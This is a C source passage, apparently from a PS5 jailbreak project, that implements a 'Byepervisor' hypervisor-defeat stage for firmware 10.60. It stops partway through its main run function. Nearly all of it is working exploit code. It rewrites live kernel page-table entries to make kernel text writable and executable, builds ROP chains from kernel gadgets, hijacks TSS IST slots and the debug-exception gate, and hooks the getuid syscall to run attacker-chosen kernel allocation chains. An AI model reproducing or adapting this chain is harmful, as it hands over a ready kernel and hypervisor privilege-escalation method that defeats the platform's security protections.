// 10.60 GameOS-return carrier. Layout and 16-CPU IST fallbacks follow
// ps5-linux-loader/source/hv_defeat_1160.c (GPL-3.0); no Linux takeover hooks.
#include <stdlib.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <ps5/kernel.h>
#include "kdlsym.h"
#include "khook.h"
#include "hv_1060.h"
#include "paging.h"
#include "phase3_module1060.h"
#include "runtime_exec1060.h"
#include "util.h"
#if defined(PHASE1_CARRIER)
#include "phase1_allocator1060.h"
#elif defined(PHASE2_CARRIER)
#include "phase2_router1060.h"
#endif
extern unsigned char break_hv[];
extern unsigned int break_hv_len;
extern int send_1060_result(const char *result);
#define NCPU FW1060_CPU_COUNT
#define AP_PA 0x3ffff000ULL
#define CAVE_ORACLE 0x440ULL
#define CAVE_FALLBACK 0x1400ULL
#define CAVE_SOURCE 0x2800ULL
#define CAVE_SAVE 0x3000ULL
#define CAVE_STASH 0x3400ULL
#define CAVE_STATE 0x3000ULL
#define STATE_ARMED 0x493950524f444152ULL
#define AP_MODE 0x313631312d504142ULL
#define MARK_ENTERED 0x454e544552454431ULL
#define MARK_STRIKE 0x31454b4952545356ULL
#define MARK_DONE 0x444f4e452d415031ULL
#define CHAIN_MARK 0x434841494e2d3031ULL
#define TSS_SLOT(base, cpu) ((base) + (uint64_t)(cpu) * 0x68 + 0x4c)

static int runtime_exec_pipe = -1;
static uint8_t runtime_exec_zeroes[RUNTIME_EXEC1060_PAGE_SIZE];
static hv1060_result_diag_t result_diagnostic;

void hv1060_get_result_diag(hv1060_result_diag_t *diagnostic)
{
  if (diagnostic)
    *diagnostic = result_diagnostic;
}

static int readk(uint64_t va, void *out, size_t len)
{
  return kernel_copyout(va, out, len);
}
static int writek(uint64_t va, const void *in, size_t len)
{
  return kernel_copyin(in, va, len);
}
static int readq(uint64_t va, uint64_t *out)
{
  return readk(va, out, sizeof(*out));
}
static int writeq(uint64_t va, uint64_t value)
{
  return writek(va, &value, sizeof(value));
}
static int checked_write(uint64_t va, const void *data, size_t len)
{
  uint8_t verify[0x400];
  if (len > sizeof(verify) || writek(va, data, len) ||
      readk(va, verify, len))
    return -1;
  return memcmp(verify, data, len) ? -1 : 0;
}
static int checked_q(uint64_t va, uint64_t value)
{
  uint64_t actual;
  return writeq(va, value) || readq(va, &actual) || actual != value ? -1 : 0;
}

// Walk the live kernel CR3 directly: the SDK's 13.x recursive-map globals
// are not supplied by the 10.60 offset table.
static int make_ap_executable(uint64_t cr3, uint64_t dmap)
{
  uint64_t table = cr3;
  const uint64_t va = dmap + AP_PA;
  for (int level = 0; level < 4; ++level) {
    uint64_t entry, addr = dmap + (table & 0x000ffffffffff000ULL) +
                           (((va >> (39 - level * 9)) & 0x1ff) * 8);
    if (readq(addr, &entry) || !(entry & 1))
      return -1;
    if (entry & (1ULL << 63)) {
      entry &= ~(1ULL << 63);
      if (checked_q(addr, entry))
        return -1;
    }
    if ((level == 1 || level == 2) && (entry & 0x80))
      return 0;
    if (level == 3)
      return 0;
    table = entry;
  }
  return -1;
}

static int make_kernel_page_rwx(uint64_t pmap, uint64_t address,
                                uint64_t *leaf_address, uint64_t *leaf_value)
{
  uint64_t entry_address[4] = {0}, entry[4] = {0}, observed;
  int count = 2;

  entry_address[0] = find_pml4e(pmap, address, &entry[0]);
  entry_address[1] = find_pdpe(pmap, address, &entry[1]);
  if (entry_address[0] == UINT64_MAX || entry_address[1] == UINT64_MAX ||
      !(entry[0] & 1) || !(entry[1] & 1))
    return -1;
  if (!(entry[1] & (1ULL << PDE_PS))) {
    entry_address[2] = find_pde(pmap, address, &entry[2]);
    if (entry_address[2] == UINT64_MAX || !(entry[2] & 1))
      return -1;
    count = 3;
    if (!(entry[2] & (1ULL << PDE_PS))) {
      entry_address[3] = find_pte(pmap, address, &entry[3]);
      if (entry_address[3] == UINT64_MAX || !(entry[3] & 1))
        return -1;
      count = 4;
    }
  }
  for (int i = 0; i < count; ++i) {
    entry[i] |= 1ULL << PDE_RW;
    entry[i] &= ~((1ULL << PDE_XOTEXT) | (1ULL << PDE_EXECUTE_DISABLE));
    if (checked_q(entry_address[i], entry[i]) ||
        readq(entry_address[i], &observed) || observed != entry[i])
      return -1;
  }
  *leaf_address = entry_address[count - 1];
  *leaf_value = entry[count - 1];
  return 0;
}

#define RESERVED_PAGE_MAX 8U
#define RESERVED_ENTRY_MAX (RESERVED_PAGE_MAX * 4U)

typedef struct {
  uint64_t address;
  uint64_t original;
  uint64_t requested;
} reserved_entry_change_t;

static int add_reserved_change(reserved_entry_change_t *changes,
                               size_t *count, uint64_t address,
                               uint64_t original)
{
  for (size_t i = 0; i < *count; ++i) {
    if (changes[i].address == address)
      return runtime_exec1060_pte_invariant_equal(
          changes[i].original, original) ? 0 : -1;
  }
  if (*count >= RESERVED_ENTRY_MAX)
    return -1;
  changes[*count].address = address;
  changes[*count].original = original;
  changes[*count].requested =
      (original | (1ULL << PDE_RW)) &
      ~((1ULL << PDE_XOTEXT) | (1ULL << PDE_EXECUTE_DISABLE));
  ++*count;
  return 0;
}

static int checked_page_entry(uint64_t address, uint64_t requested)
{
  uint64_t readback = 0;
  return writeq(address, requested) ||
         readq(address, &readback) ||
         !runtime_exec1060_pte_invariant_equal(requested, readback) ? -1 : 0;
}


static int record_preparation_refusal(uint64_t cave,
                                      runtime_exec1060_page_t *runtime_page,
                                      uint64_t state)
{
  runtime_page->preparation_state = state;
  checked_write(cave + RUNTIME_EXEC1060_CAVE_OFFSET, runtime_page,
                sizeof(*runtime_page));
  return -1;
}

static int record_preparation_detail(uint64_t cave,
                                     runtime_exec1060_page_t *runtime_page,
                                     uint64_t state, uint64_t address,
                                     uint64_t expected, uint64_t readback)
{
  runtime_page->preparation_address = address;
  runtime_page->preparation_expected = expected;
  runtime_page->preparation_readback = readback;
  return record_preparation_refusal(cave, runtime_page, state);
}

static int prepare_reserved_pages(uint64_t pmap, uint64_t cave,
                                  runtime_exec1060_page_t *runtime_page)
{
  reserved_entry_change_t changes[RESERVED_ENTRY_MAX] = {{0}};
  uint64_t page_offsets[RESERVED_PAGE_MAX] = {0};
  size_t page_count = fw1060_reserved_text_pages(
      page_offsets, RESERVED_PAGE_MAX);
  size_t change_count = 0, written = 0;
  uint64_t failure_state = RUNTIME_EXEC1060_PREP_PERMISSION_FAILED;
  int rollback_failed = 0;

  if (page_count == 0)
    return record_preparation_refusal(
        cave, runtime_page, RUNTIME_EXEC1060_PREP_HIERARCHY_FAILED);
  for (size_t page_index = 0; page_index < page_count; ++page_index) {
    uint64_t address = KERNEL_ADDRESS_TEXT_BASE + page_offsets[page_index];
    uint64_t entry_address[4] = {0}, entry[4] = {0};
    size_t levels = 2;
    entry_address[0] = find_pml4e(pmap, address, &entry[0]);
    entry_address[1] = find_pdpe(pmap, address, &entry[1]);
    if (entry_address[0] == UINT64_MAX || !(entry[0] & 1))
      return record_preparation_detail(
          cave, runtime_page, RUNTIME_EXEC1060_PREP_HIERARCHY_FAILED,
          entry_address[0] == UINT64_MAX ? address : entry_address[0],
          1, entry[0]);
    if (entry_address[1] == UINT64_MAX || !(entry[1] & 1) ||
        (entry[1] & (1ULL << PDE_PS)))
      return record_preparation_detail(
          cave, runtime_page, RUNTIME_EXEC1060_PREP_HIERARCHY_FAILED,
          entry_address[1] == UINT64_MAX ? address : entry_address[1],
          entry[1] & ~(1ULL << PDE_PS), entry[1]);
    entry_address[2] = find_pde(pmap, address, &entry[2]);
    if (entry_address[2] == UINT64_MAX || !(entry[2] & 1))
      return record_preparation_detail(
          cave, runtime_page, RUNTIME_EXEC1060_PREP_HIERARCHY_FAILED,
          entry_address[2] == UINT64_MAX ? address : entry_address[2],
          1, entry[2]);
    levels = 3;
    if (!(entry[2] & (1ULL << PDE_PS))) {
      entry_address[3] = find_pte(pmap, address, &entry[3]);
      if (entry_address[3] == UINT64_MAX || !(entry[3] & 1))
        return record_preparation_detail(
            cave, runtime_page, RUNTIME_EXEC1060_PREP_HIERARCHY_FAILED,
            entry_address[3] == UINT64_MAX ? address : entry_address[3],
            1, entry[3]);
      levels = 4;
    }
    for (size_t level = 0; level < levels; ++level)
      if (add_reserved_change(changes, &change_count, entry_address[level],
                              entry[level]) != 0)
        return record_preparation_detail(
            cave, runtime_page, RUNTIME_EXEC1060_PREP_HIERARCHY_FAILED,
            entry_address[level], 0, entry[level]);
  }

  for (size_t i = 0; i < change_count; ++i) {
    ++written;
    if (checked_page_entry(changes[i].address, changes[i].requested))
      goto rollback;
  }
  failure_state = RUNTIME_EXEC1060_PREP_LEAF_FAILED;
  for (size_t pair_index = 0; pair_index < FW1060_CFI_PAIR_COUNT;
       ++pair_index) {
    const fw1060_cfi_pair_t *pair =
        &g_fw1060_profile.cfi_pairs[pair_index];
    const uint64_t addresses[2] = {
      KERNEL_ADDRESS_TEXT_BASE + pair->thunk_offset,
      KERNEL_ADDRESS_TEXT_BASE + pair->landing_offset,
    };
    for (size_t side = 0; side < 2; ++side) {
      uint64_t leaf = 0, leaf_address = 0;
      unsigned levels = 0;
      if (find_mapping_leaf(pmap, addresses[side], &leaf_address, &leaf,
                            &levels) != 0 ||
          levels < 3 ||
          !(leaf & (1ULL << PDE_PRESENT)) ||
          !(leaf & (1ULL << PDE_RW)) ||
          (leaf & ((1ULL << PDE_XOTEXT) |
                   (1ULL << PDE_EXECUTE_DISABLE))))
        goto rollback;
      runtime_page->reservation_pte_address[pair_index][side] = leaf_address;
      runtime_page->reservation_pte_value[pair_index][side] = leaf;
      runtime_page->reservation_levels[pair_index][side] = (uint8_t)levels;
    }
  }
  failure_state = RUNTIME_EXEC1060_PREP_RECORD_FAILED;
  if (checked_write(cave + RUNTIME_EXEC1060_CAVE_OFFSET, runtime_page,
                    sizeof(*runtime_page)))
    goto rollback;
  return 0;

rollback:
  while (written) {
    uint64_t readback = 0;
    const reserved_entry_change_t *change = &changes[--written];
    if (writeq(change->address, change->original) ||
        readq(change->address, &readback) ||
        !runtime_exec1060_pte_invariant_equal(change->original, readback))
      rollback_failed = 1;
  }
  if (rollback_failed) {
    runtime_page->preparation_state = RUNTIME_EXEC1060_PREP_QUARANTINED;
    checked_write(cave + RUNTIME_EXEC1060_CAVE_OFFSET, runtime_page,
                  sizeof(*runtime_page));
    return -2;
  }
  return record_preparation_refusal(cave, runtime_page, failure_state);
}

static int allocate_runtime_exec_page(uint64_t pmap, uint64_t cave,
                                      runtime_exec1060_page_t *page)
{
  runtime_exec1060_page_t empty = {0};
  uint64_t file_data = 0;
  int pipe_fds[2] = {-1, -1};

  if (checked_write(cave + RUNTIME_EXEC1060_CAVE_OFFSET, &empty,
                    sizeof(empty)) ||
      pipe2(pipe_fds, O_NONBLOCK) ||
      write(pipe_fds[1], runtime_exec_zeroes,
            sizeof(runtime_exec_zeroes)) != (ssize_t)sizeof(runtime_exec_zeroes)) {
    if (pipe_fds[0] >= 0)
      close(pipe_fds[0]);
    if (pipe_fds[1] >= 0)
      close(pipe_fds[1]);
    return -1;
  }
  close(pipe_fds[1]);
  if (!(file_data = kernel_get_proc_file(-1, pipe_fds[0])) ||
      readq(file_data + 0x10, &page->address) || !page->address)
    goto fail;

  if (make_kernel_page_rwx(pmap, page->address, &page->pte_address,
                           &page->pte_value))
    goto fail;
  page->magic = RUNTIME_EXEC1060_MAGIC;
  if (checked_write(cave + RUNTIME_EXEC1060_CAVE_OFFSET, page,
                    sizeof(*page)))
    goto fail;
  runtime_exec_pipe = pipe_fds[0];
  return 0;

fail:
  close(pipe_fds[0]);
  checked_write(cave + RUNTIME_EXEC1060_CAVE_OFFSET, &empty, sizeof(empty));
  return -1;
}

static int restore_ists(uint64_t tss, const uint64_t saved[NCPU])
{
  int failed = 0;
  for (int i = 0; i < NCPU; ++i)
    failed |= writeq(TSS_SLOT(tss, i), saved[i]) != 0;
  for (int i = 0; i < NCPU; ++i) {
    uint64_t actual;
    failed |= readq(TSS_SLOT(tss, i), &actual) != 0 || actual != saved[i];
  }
  return failed ? -1 : 0;
}

static int validate_tss(uint64_t tss, int db_ist, uint64_t saved[NCPU])
{
  uint64_t rsp[NCPU], db_stack[NCPU];
  for (int cpu = 0; cpu < NCPU; ++cpu) {
    uint64_t base = tss + (uint64_t)cpu * 0x68;
    if (readq(base + 4, &rsp[cpu]) ||
        readq(base + 0x24 + (db_ist - 1) * 8, &db_stack[cpu]) ||
        readq(TSS_SLOT(tss, cpu), &saved[cpu]) ||
        (rsp[cpu] >> 47) != 0x1ffff || !db_stack[cpu] || saved[cpu])
      return -1;
    for (int prior = 0; prior < cpu; ++prior)
      if (rsp[cpu] == rsp[prior] || db_stack[cpu] == db_stack[prior])
        return -1;
  }
  return 0;
}

static int stage_fallbacks(uint64_t cave)
{
  for (int cpu = 1; cpu < NCPU; ++cpu) {
    uint64_t va = cave + CAVE_FALLBACK + (uint64_t)(cpu - 1) * 0x100;
    uint8_t chain[0x100] = {0};
    uint64_t iret = kgadget(KERNEL_GADGET_IRETQ);
    uint64_t pop_rsp = kgadget(KERNEL_GADGET_POP_RSP);
    uint64_t trampoline = va + 0x20;
    memcpy(chain + 0x20, &iret, 8);
    memcpy(chain + 0x50, &pop_rsp, 8);
    memcpy(chain + 0x58, &trampoline, 8);
    if (checked_write(va, chain, sizeof(chain)))
      return -1;
  }
  return 0;
}

static int check_results(uint64_t cave, uint64_t tss,
                         const uint64_t saved[NCPU], uint64_t gate_lo,
                         uint64_t gate_hi)
{
  uint64_t result[8], detail[7], gate[2];
  memset(&result_diagnostic, 0, sizeof(result_diagnostic));
  if (readk(cave + CAVE_ORACLE, result, sizeof(result)))
    return -1;
  if (result[3] != MARK_DONE)
    return 0; // not yet resumed / AP still executing
  if (readk(cave + CAVE_STASH, detail, sizeof(detail)) ||
      readk(kdlsym(KERNEL_SYM_IDT_ARRAY) + 16, gate, sizeof(gate)))
    return -1;
  memcpy(result_diagnostic.oracle, result, sizeof(result));
  memcpy(result_diagnostic.detail, detail, sizeof(detail));
  memcpy(result_diagnostic.gate, gate, sizeof(gate));
  result_diagnostic.valid = 1;
  // A failed AP scan still requires IST cleanup. Never restore until the
  // original #DB gate is back, otherwise ordinary debug traps may fault.
  if (gate[0] != gate_lo || gate[1] != gate_hi)
    return -2;
  int cleanup_error = restore_ists(tss, saved);
  if (!cleanup_error)
    cleanup_error = checked_q(cave + CAVE_STATE, 0);
  if (cleanup_error)
    return -3;
  if (result[0] != MARK_ENTERED || result[1] != MARK_STRIKE ||
      result[5] || result[6] != NCPU || result[7] != NCPU ||
      detail[0] || detail[2] != 1 || detail[3] != NCPU ||
      detail[5] != NCPU || detail[6] != NCPU) {
    printf("10.60 AP failed: error=%lu self=%lu targets=%lu written=%lu verified=%lu\n",
           detail[0], detail[2], detail[3], detail[5], detail[6]);
    return -4;
  }
  printf("10.60 AP verified: 16/16 VMCBs; all IST6 slots restored\n");
  notifyf("Byepervisor 10.60: 16/16 VMCBs; all IST6 slots restored");
  return 1;
}

#ifdef PHASE2_CARRIER
static int phase2_prealloc_diagnostic(uint64_t address,
                                      phase2_prealloc_record_t *record,
                                      uint64_t stage, uint64_t detail)
{
  record->diagnostic_stage = stage;
  record->diagnostic_detail = detail;
  return checked_q(address +
                   offsetof(phase2_prealloc_record_t, diagnostic_stage),
                   stage) ||
         checked_q(address +
                   offsetof(phase2_prealloc_record_t, diagnostic_detail),
                   detail) ? -1 : 0;
}

static int phase2_getuid_target(uint64_t *target)
{
  uint64_t proc, vector, table, count;
  proc = kernel_get_proc(getpid());
  if (!target || !proc ||
      readq(proc + g_fw1060_profile.proc_p_sysent_offset, &vector) ||
      !vector || readq(vector, &count) ||
      count != g_fw1060_profile.syscall_count ||
      readq(vector + g_fw1060_profile.sysentvec_table_offset, &table) ||
      !table || SYS_getuid >= (int)g_fw1060_profile.syscall_count ||
      readq(table + (uint64_t)SYS_getuid * g_fw1060_profile.sysent_size +
            g_fw1060_profile.sy_call_offset, target) ||
      *target < KERNEL_ADDRESS_TEXT_BASE || *target >= KERNEL_ADDRESS_DATA_BASE)
    return -1;
  return 0;
}

#ifdef PHASE3_CARRIER
static int phase3_disk_blob_image_size(uint64_t *image_size)
{
  phase3_blob_view_t blob;struct stat st;void *mapped=MAP_FAILED;int fd=-1,result=-1;
  if(!image_size||(fd=open(PHASE3_BLOB_PATH,O_RDONLY))<0||fstat(fd,&st)||
     st.st_size<=0||(uintmax_t)st.st_size>SIZE_MAX)
    goto out;
  mapped=mmap(NULL,(size_t)st.st_size,PROT_READ,MAP_PRIVATE,fd,0);
  if(mapped==MAP_FAILED||
     phase3_blob_validate(mapped,(size_t)st.st_size,&blob))
    goto out;
  *image_size=blob.header.image_size;result=0;
out:
  if(mapped!=MAP_FAILED)munmap(mapped,(size_t)st.st_size);
  if(fd>=0)close(fd);
  return result;
}
#endif
static int phase2_preallocate(uint64_t cave, uint64_t idt, uint64_t tss,
                              phase2_prealloc_record_t *record)
{
  const uint64_t record_address = cave + PHASE2_PREALLOC_OFFSET;
  const uint64_t malloc_type =
      KERNEL_ADDRESS_TEXT_BASE + g_fw1060_profile.malloc_type_offset;
  const uint32_t flags =
      g_fw1060_profile.malloc_nowait | g_fw1060_profile.malloc_zero;
  uint64_t hook_target = 0;
#ifdef PHASE3_CARRIER
  uint64_t image_size=0;
#endif
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_bytes[0x400];
  int result;

#ifdef PHASE3_CARRIER
  if(phase3_disk_blob_image_size(&image_size)||
     phase3_prealloc_prepare(record,malloc_type,flags,image_size))
    return -1;
#else
  phase2_prealloc_prepare(record, malloc_type, flags);
#endif
  record->diagnostic_stage = 1;
  if (checked_write(record_address, record, sizeof(*record)))
    return -1;
  if (phase2_getuid_target(&hook_target)) {
    phase2_prealloc_diagnostic(record_address, record, 2, 0x100);
    return -1;
  }
  result = kh_init(&hook, readk, writek, ktext(0), cave + 0x4000, 6);
  if (result) {
    phase2_prealloc_diagnostic(record_address, record, 2, (uint64_t)-result);
    return -1;
  }
  hook.tss_stride = 0x68;
  hook.oneshot = 1;
  kh_set_tables(&hook, idt, tss);
  kh_set_core(&hook, 0);
  /*
   * Resolve the guaranteed executed target from this process's verified stock
   * getuid sysent. The firmware offset table does not define SYS_GETUID:
   * kdlsym returned zero live, and the old +0xe accidentally targeted 0xe.
   * The stock sy_call is the CFI-valid entry actually reached by dispatch.
   * RDI/td is dynamically preserved; getuid ignores its uap.
   */
  kh_set_hook_target(&hook, hook_target);
  /*
   * Retail 10.60 cannot recover RSI/RDX from its shortened #DB save frame and
   * rejects installation without explicit resume values. Both are unused by
   * sys_getuid and resume as zero.
   */
  kh_set_resume_rsi(&hook, 0);
  kh_set_resume_rdx(&hook, 0);
  kh_chain_init(&chain, chain_bytes, sizeof(chain_bytes));
  for (unsigned i = 0; i < PHASE2_ALLOCATION_COUNT; ++i) {
    kh_chain_call(&chain,
        KERNEL_ADDRESS_TEXT_BASE + g_fw1060_profile.malloc_offset, 3,
        record->sizes[i], malloc_type, flags);
    kh_chain_store_rax(&chain, record_address +
        offsetof(phase2_prealloc_record_t, addresses) +
        i * sizeof(uint64_t));
  }
  kh_chain_store(&chain,
      record_address + offsetof(phase2_prealloc_record_t, state),
      PHASE2_PREALLOC_FIRED);
  if (chain.err) {
    phase2_prealloc_diagnostic(record_address, record, 3, chain.len);
    return -1;
  }
  result = kh_install(&hook, &chain);
  if (result) {
    phase2_prealloc_diagnostic(record_address, record, 4, (uint64_t)-result);
    return -1;
  }
  if (phase2_prealloc_diagnostic(record_address, record, 5, chain.len))
    return -1;
  kh_trigger(&hook);
  (void)syscall(SYS_getuid);
  if (phase2_prealloc_diagnostic(record_address, record, 6, 0))
    return -1;
  result = kh_restore(&hook);
  if (result) {
    phase2_prealloc_diagnostic(record_address, record, 7, (uint64_t)-result);
    return -1;
  }
  if (readk(record_address, record, sizeof(*record)))
    return -1;
  if (phase2_prealloc_fired_validate(record, malloc_type, flags)) {
    phase2_prealloc_diagnostic(record_address, record, 8,
        ((uint64_t)record->state << 32) |
        (record->addresses[0] != 0) |
        ((uint64_t)(record->addresses[1] != 0) << 1) |
        ((uint64_t)(record->addresses[2] != 0) << 2));
    return -1;
  }
  return phase2_prealloc_diagnostic(record_address, record, 9, 0);
}

static int phase2_replace_allocation(uint64_t cave, uint64_t idt, uint64_t tss,
                                     phase2_prealloc_record_t *record,
                                     unsigned index, unsigned attempt)
{
  const uint64_t record_address = cave + PHASE2_PREALLOC_OFFSET;
  const uint64_t malloc_type =
      KERNEL_ADDRESS_TEXT_BASE + g_fw1060_profile.malloc_type_offset;
  const uint32_t flags =
      g_fw1060_profile.malloc_nowait | g_fw1060_profile.malloc_zero;
  const uint64_t old_address = record->addresses[index];
  uint64_t hook_target = 0;
  uint8_t chain_bytes[0x300];
  khook_t hook;
  kh_chain_t chain;
  int result;

  if (phase2_getuid_target(&hook_target) ||
      kh_init(&hook, readk, writek, ktext(0), cave + 0x4000, 6))
    return -1;
  hook.tss_stride = 0x68;
  hook.oneshot = 1;
  kh_set_tables(&hook, idt, tss);
  kh_set_core(&hook, 0);
  kh_set_hook_target(&hook, hook_target);
  kh_set_resume_rsi(&hook, 0);
  kh_set_resume_rdx(&hook, 0);
  kh_chain_init(&chain, chain_bytes, sizeof(chain_bytes));
  /*
   * Allocate before freeing so the allocator cannot immediately return the
   * same broad-mapped block. Exactly one allocation for this role remains.
   */
  kh_chain_call(&chain,
      KERNEL_ADDRESS_TEXT_BASE + g_fw1060_profile.malloc_offset, 3,
      record->sizes[index], malloc_type, flags);
  kh_chain_store_rax(&chain, record_address +
      offsetof(phase2_prealloc_record_t, addresses) +
      index * sizeof(uint64_t));
  kh_chain_call(&chain,
      KERNEL_ADDRESS_TEXT_BASE + g_fw1060_profile.free_offset, 2,
      old_address, malloc_type, 0);
  if (chain.err || kh_install(&hook, &chain))
    return -1;
  kh_trigger(&hook);
  (void)syscall(SYS_getuid);
  result = kh_restore(&hook);
  if (result || readk(record_address, record, sizeof(*record)) ||
      !record->addresses[index] || record->addresses[index] == old_address ||
      phase2_prealloc_fired_validate(record, malloc_type, flags))
    return -1;
  return phase2_prealloc_diagnostic(record_address, record, 11,
                                    ((uint64_t)index << 32) | attempt);
}

static int phase2_prepare_failure(uint64_t cave,
                                  phase2_prealloc_record_t *record,
                                  uint64_t detail)
{
  record->diagnostic_stage = 10;
  record->diagnostic_detail = detail;
  (void)checked_write(cave + PHASE2_PREALLOC_OFFSET, record, sizeof(*record));
  return -1;
}

static int phase2_prepare_allocations(uint64_t pmap, uint64_t cave,
                                      phase2_prealloc_record_t *record)
{
  uint64_t address = 0, value = 0, prepared_address, prepared_value;
  unsigned levels = 0;
  if (find_mapping_leaf(pmap, record->addresses[1],
                        &record->data_leaf_address,
                        &record->data_leaf_value, &levels) || levels != 4) {
    phase2_prepare_failure(cave, record,
        0x2000000000000000ULL | ((uint64_t)levels << 48) |
        (record->data_leaf_value & 0x0000ffffffffffffULL));
    return levels == 3 ? -3 : -1;
  }
  record->data_levels = (uint8_t)levels;
  for (unsigned i = 0; i < PHASE2_CLONE_PAGE_COUNT; ++i) {
    levels = 0;
    if (find_mapping_leaf(pmap, record->addresses[2] + (uint64_t)i * 0x1000,
                          &record->clone_leaf_address[i],
                          &record->clone_leaf_value[i], &levels) ||
        levels != 4) {
      phase2_prepare_failure(cave, record,
          0x3000000000000000ULL | ((uint64_t)i << 52) |
          ((uint64_t)levels << 48) |
          (record->clone_leaf_value[i] & 0x0000ffffffffffffULL));
      return i == 0 && levels == 3 ? -4 : -1;
    }
  }
  record->clone_page_count = PHASE2_CLONE_PAGE_COUNT;
#ifdef PHASE3_CARRIER
  uint64_t page_count=record->sizes[0]/0x1000,layout_code,layout_state;
  size_t journal_size=0;uint64_t layout_pages;
  phase3_code_journal_t *journal;
  uint64_t prepared=0;
  if(record->sizes[0]<=PHASE3_IMAGE_OFFSET||
     phase3_prealloc_layout(record->sizes[0]-PHASE3_IMAGE_OFFSET,
                            &layout_code,&layout_state,&layout_pages,
                            &journal_size)||
     layout_code!=record->sizes[0]||layout_state!=record->sizes[1]||
     layout_pages!=page_count){
    return phase2_prepare_failure(cave,record,0x6000000000000000ULL);
  }
  journal=calloc(1,journal_size);
  if(!journal){
    return phase2_prepare_failure(cave,record,0x6000000000000001ULL);
  }
  journal->magic=PHASE3_JOURNAL_MAGIC;
  journal->count=page_count;
  for(uint64_t i=0;i<page_count;++i){
    uint64_t va=record->addresses[0]+(uint64_t)i*0x1000;
    levels=0;
    if(find_mapping_leaf(pmap,va,&address,&value,&levels)||levels!=4||
       make_kernel_page_rwx(pmap,va,&prepared_address,&prepared_value)||
       prepared_address!=address){
      while(prepared){
        --prepared;
        writeq(journal->entries[prepared].leaf_address,
               journal->entries[prepared].original);
      }
      free(journal);
      phase2_prepare_failure(cave,record,
          0x1000000000000000ULL|((uint64_t)i<<32)|((uint64_t)levels<<48));
      return i==0&&levels==3?-2:-1;
    }
    journal->entries[i].leaf_address=address;
    journal->entries[i].original=value;
    journal->entries[i].final=prepared_value&~FW1060_PAGE_WRITABLE&
                              ~FW1060_PAGE_NX&~FW1060_PAGE_XOTEXT;
    ++prepared;
  }
  journal->checksum=phase3_code_journal_checksum(journal);
  record->journal_address=record->addresses[1]+PHASE3_JOURNAL_OFFSET;
  for(size_t off=0;off<journal_size;off+=0x400){
    size_t count=journal_size-off;
    if(count>0x400)count=0x400;
    if(checked_write(record->journal_address+off,(uint8_t *)journal+off,count)){
      while(prepared){
        --prepared;
        writeq(journal->entries[prepared].leaf_address,
               journal->entries[prepared].original);
      }
      free(journal);
      return phase2_prepare_failure(cave,record,0x7000000000000000ULL|off);
    }
  }
  record->journal_checksum=journal->checksum;
  record->code_page_count=journal->count;
  record->code_leaf_address=journal->entries[0].leaf_address;
  record->code_leaf_original=journal->entries[0].original;
  record->code_leaf_prepared=journal->entries[0].final|FW1060_PAGE_WRITABLE;
  record->code_levels=4;
  if(phase2_leaf_contract_safe(record)||
     checked_write(cave+PHASE2_PREALLOC_OFFSET,record,sizeof(*record))){
    while(prepared){
      --prepared;
      writeq(journal->entries[prepared].leaf_address,
             journal->entries[prepared].original);
    }
    free(journal);
    return phase2_prepare_failure(cave,record,0x5000000000000000ULL);
  }
  free(journal);
  return 0;
#else
  if (find_mapping_leaf(pmap, record->addresses[0], &address, &value,
                        &levels) || levels != 4) {
    phase2_prepare_failure(cave, record,
        0x1000000000000000ULL | ((uint64_t)levels << 48) |
        (value & 0x0000ffffffffffffULL));
    return levels == 3 ? -2 : -1;
  }
  record->code_leaf_address = address;
  record->code_leaf_original = value;
  record->code_levels = (uint8_t)levels;
  if (make_kernel_page_rwx(pmap, record->addresses[0], &prepared_address,
                           &prepared_value) ||
      prepared_address != record->code_leaf_address)
    return phase2_prepare_failure(cave, record, 0x4000000000000000ULL);
  record->code_leaf_prepared = prepared_value;
  if (phase2_leaf_contract_safe(record))
    return phase2_prepare_failure(cave, record, 0x5000000000000000ULL);
  if (checked_write(cave + PHASE2_PREALLOC_OFFSET, record, sizeof(*record)))
    return -1;
  return 0;
#endif
}
#endif


int hv1060_run(void)
{
  uint64_t proc, vmspace, pmap, pml4, cr3, dmap, gate[2], saved[NCPU];
  uint64_t cave = kdlsym(KERNEL_SYM_DATA_CAVE);
  uint64_t tss = kdlsym(KERNEL_SYM_COMMON_TSS);
  uint64_t idt = kdlsym(KERNEL_SYM_IDT_ARRAY);
  uint64_t oracle = cave + CAVE_ORACLE;
  uint64_t hook_scratch = cave;
  uint64_t state;
  runtime_exec1060_page_t runtime_page = {0};
  uint64_t thunk_pte_address = 0, thunk_pte = 0;
  uint64_t target_pte_address = 0, target_pte = 0;
  khook_t hook;
  memset(&result_diagnostic, 0, sizeof(result_diagnostic));
  kh_chain_t chain;
  uint8_t chain_buf[0x800], source[0x800] = {0};
  uint64_t armed_gate, armed_ist, expected_gate, pivot;
  char arm_report[768];
  int db_ist, r, rollback_error;
#ifdef PHASE1_CARRIER
  phase1_prealloc_record_t prealloc = {0}, prealloc_readback = {0};
  phase1_framework_locator_t locator_readback = {0};
  const uint64_t prealloc_address = cave + PHASE1_PREALLOC_OFFSET;
  const uint64_t malloc_type =
      KERNEL_ADDRESS_TEXT_BASE + g_fw1060_profile.malloc_type_offset;
  const uint32_t malloc_flags =
      g_fw1060_profile.malloc_nowait | g_fw1060_profile.malloc_zero;
  hook_scratch = cave + 0x4000;
#endif
#ifdef PHASE2_CARRIER
  phase2_prealloc_record_t phase2_prealloc = {0};
  phase2_locator_t phase2_locator = {0};
  hook_scratch = cave + 0x4000;
#endif

  if (fw1060_identity_validate(kernel_get_fw_version(),
                               sceKernelGetMainSocId(), NCPU) != 0 ||
      !cave || !tss || !idt || break_hv_len == 0 ||
      break_hv_len > sizeof(source))
    return -1; // regular retail 10.60 only
  proc = kernel_get_proc(0);
  if (!proc || readq(proc + KERNEL_OFFSET_PROC_P_VMSPACE, &vmspace) ||
      !vmspace || readq(vmspace + 0x1d8, &pmap) || !pmap ||
      readq(pmap + 0x20, &pml4) || readq(pmap + 0x28, &cr3) ||
      !pml4 || !cr3 || (pml4 >> 48) != 0xffff || (cr3 & 0xfff) ||
      cr3 >= 0x1000000000ULL || ((pml4 - cr3) & 0x3fff))
    return -2;
  dmap = pml4 - cr3;
  kdset_dmap_1060(dmap);
#ifdef PHASE1_CARRIER
  if (readk(prealloc_address, &prealloc_readback, sizeof(prealloc_readback)) ||
      memcmp(&prealloc_readback, &(phase1_prealloc_record_t){0},
             sizeof(prealloc_readback)) ||
      readk(cave + PHASE1_LOCATOR_OFFSET, &locator_readback,
            sizeof(locator_readback)) ||
